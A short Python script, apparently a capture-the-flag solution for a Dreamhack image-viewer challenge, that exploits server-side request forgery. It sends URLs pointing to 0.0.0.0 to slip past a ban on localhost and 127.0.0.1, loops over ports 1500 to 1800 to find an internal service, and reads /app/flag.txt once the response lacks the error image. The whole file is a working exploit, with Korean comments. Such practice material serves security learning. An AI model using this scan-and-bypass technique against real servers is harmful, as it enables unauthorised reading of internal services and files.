import requests

url = f"http://host3.dreamhack.games:24474/img_viewer"
#<img src="data:image/png;base64, iVBORw0KGgoAAAANSUhE...">
#base64 인코딩 출력 일부 값
value = "iVBORw0KGgoAAAANSUhE"

#port 1500~1800
for port in range(1500,1801):
    #loopback(ban: localhost, 127.0.0.1)
    #/app/flag.txt
    port = str(port)
    randome_url = f"http://0.0.0.0:{port}/flag.txt"
    data = {
        "url" : randome_url
    }
    response = requests.post(url, data)
    #print(response.text)
    content_length = response.headers["Content-Length"]
    
    if value in response.text:
        print(f"randome_url: {randome_url}, Content-Length: {content_length} => failure \n")
    else:
        print(f"[*] randome_url: {randome_url}, Content-Length: {content_length} => success")
        print(response.text)
        break